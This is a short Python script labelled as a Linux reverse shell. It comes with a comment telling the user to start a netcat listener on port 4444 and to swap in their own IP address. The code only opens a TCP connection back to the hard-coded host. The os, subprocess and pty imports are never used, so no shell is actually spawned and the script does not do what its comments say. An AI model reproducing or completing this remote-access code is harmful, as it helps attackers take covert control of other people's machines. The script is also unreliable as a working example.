#!/usr/bin/python3
# a python reverse shell
# set up a netcat listner
# nc -lvp 4444
# tested only on linux


import socket
import os
import subprocess
import pty

def main_connection():      
    host = "192.168.1.238"                                  # change this to your IP
    port = 4444                                             # you can change this to any port
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # make the connection
    s.connect((host, port))                                 # connect back

main_connection()


